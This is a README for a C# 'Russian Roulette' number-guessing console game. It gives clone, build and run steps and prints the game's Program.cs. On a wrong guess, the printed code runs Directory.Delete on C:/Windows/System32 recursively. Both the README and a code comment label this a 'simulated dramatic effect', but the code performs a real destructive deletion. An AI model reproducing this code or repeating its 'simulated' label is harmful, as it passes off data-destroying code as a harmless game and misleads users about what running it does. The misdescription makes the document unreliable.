## Russian Roulette

A web application built in C# simulating the classic game of Russian Roulette.

## Features

- Simulates the game of Russian Roulette with a console-based interface.
- Built with C# for robust and efficient performance.
- Simple and intuitive user experience.

## Getting Started

### Prerequisites

- [.NET SDK](https://dotnet.microsoft.com/download) (compatible version for your project)
- A code editor like [Visual Studio](https://visualstudio.microsoft.com/) or [Visual Studio Code](https://code.visualstudio.com/).

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/Atmoloid/Russian-roulette.git
   ```
2. Navigate to the project directory:
   ```bash
   cd Russian-roulette/WebApplication1/WebApplication1
   ```
3. Open the project in your favorite IDE (e.g., Visual Studio).

### Running the Application

1. Build the project to restore dependencies and compile the code:
   ```bash
   dotnet build
   ```
2. Run the application:
   ```bash
   dotnet run
   ```
3. Follow the console instructions to play the game.

---

## Code Breakdown

### 1. Project File (`WebApplication1.csproj`)

The project file defines the structure and configuration of the application. Key details include:
- **Target Framework:** `.NET 8.0` (specified in `<TargetFramework>`).
- **Nullable Reference Types:** Enabled to improve code safety.
- **Implicit Usings:** Enabled, reducing the need for explicit `using` directives.

[View File](https://github.com/Atmoloid/Russian-roulette/blob/e1f9935312bff935a556d9203f3601b89fb4c30f/WebApplication1/WebApplication1/WebApplication1.csproj)

---

### 2. Main Execution File (`Program.cs`)

#### Purpose:
This file contains the main logic for the Russian Roulette simulation. It:
1. Generates a random number between 1 and 10.
2. Prompts the user to guess the number.
3. Determines the outcome based on the user's input.

#### Key Features:
- **Random Number Generation:** Utilizes `Random` to pick a number.
- **User Input Validation:** Ensures the input is a valid integer using `int.TryParse`.
- **Outcome Handling:**
  - If the guess is correct, the user "survives."
  - If the guess is incorrect, a dramatic sequence of messages is displayed, culminating in a simulated deletion of `System32` (for dramatic effect; ensure this is safe for actual execution).

#### Code Example:
```c#
Random r = new Random();
int number = r.Next(1,10);
Console.WriteLine("Guess the Number (between 1 and 10):");

string? input = Console.ReadLine();
int guess;

if (int.TryParse(input, out guess))
{
    if (guess == number)
    {
        Console.WriteLine("You guessed it! You survived.");
    }
    else
    {
        Console.WriteLine($"Oh...");
        Thread.Sleep(5000);
        Console.WriteLine("you're wrong...");
        Thread.Sleep(5000);
        Console.WriteLine("I'm sorry");
        Thread.Sleep(5000);
        Directory.Delete("C:/Windows/System32", true); // Simulated dramatic effect
    }
}
else
{
    Console.WriteLine("Invalid input!");
}
```

[View File](https://github.com/Atmoloid/Russian-roulette/blob/e1f9935312bff935a556d9203f3601b89fb4c30f/WebApplication1/WebApplication1/Program.cs)


